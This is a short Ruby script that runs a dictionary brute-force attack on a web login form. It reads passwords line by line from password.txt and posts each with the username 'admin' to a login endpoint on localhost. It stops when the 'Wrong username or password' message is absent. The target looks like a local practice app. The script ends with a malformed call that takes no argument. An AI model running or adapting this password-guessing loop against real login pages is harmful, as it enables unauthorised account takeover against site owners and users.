
require 'net/http'
require 'uri'


def is_wrong_password? password
uri = URI.parse 'http://localhost:4567/login'
response = Net::HTTP.post_form(uri, :username => "admin", :password => password).body
response.include? "Wrong username or password, please try again"
end


input = File.open "password.txt", "r"

while (line = input.gets)
	line.strip!
	print "Truing password #{line}"
	if is_wrong_password? line
		puts "Error"
	else
		puts "Found!"
		input.close
		exit
	end
end		






puts is_wrong_password? 